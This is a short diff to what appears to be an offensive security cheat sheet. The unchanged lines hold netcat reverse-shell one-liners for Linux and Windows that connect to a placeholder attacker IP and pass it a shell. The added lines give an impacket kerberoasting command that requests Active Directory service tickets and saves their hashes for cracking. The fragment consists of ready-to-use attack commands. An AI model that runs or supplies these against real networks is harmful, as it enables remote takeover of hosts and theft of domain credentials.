@@ -256,3 +256,6 @@ nc <ATTACKER IP> <PORT> –e /bin/bash
 
 # reverse shell - netcat - windows
 nc.exe <ATTACKER IP> <PORT> –e cmd.exe
+
+# windows - active directory - kerberoasting - getting ST (service tickets) associated with user SPNs (service principal names)
+impacket-GetUserSPNs -outputfile <DOMAIN>-spns.hashes -request -dc-ip <IP> <DOMAIN>/<USER>:<PASSWORD>
